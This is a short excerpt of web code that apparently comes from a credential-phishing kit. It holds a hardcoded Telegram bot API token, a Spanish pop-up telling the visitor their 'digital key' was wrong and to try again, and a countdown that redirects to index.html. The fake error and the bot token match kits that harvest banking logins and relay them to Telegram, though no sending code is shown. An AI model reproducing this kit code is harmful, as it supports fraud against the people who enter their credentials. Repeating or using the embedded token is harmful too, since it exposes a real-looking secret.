...
$apiToken = "5767216714:AAFLlRKz5T66MjL_GmsC2zVwHOXfyLQ4ll4";
...
echo '<script language="javascript">alert("CLAVE DIGITAL INCORRECTA INTENTA NUEVAMENTE");
</script>';
...
var url="index.html";
var seconds = 150; //n�mero de segundos a contar
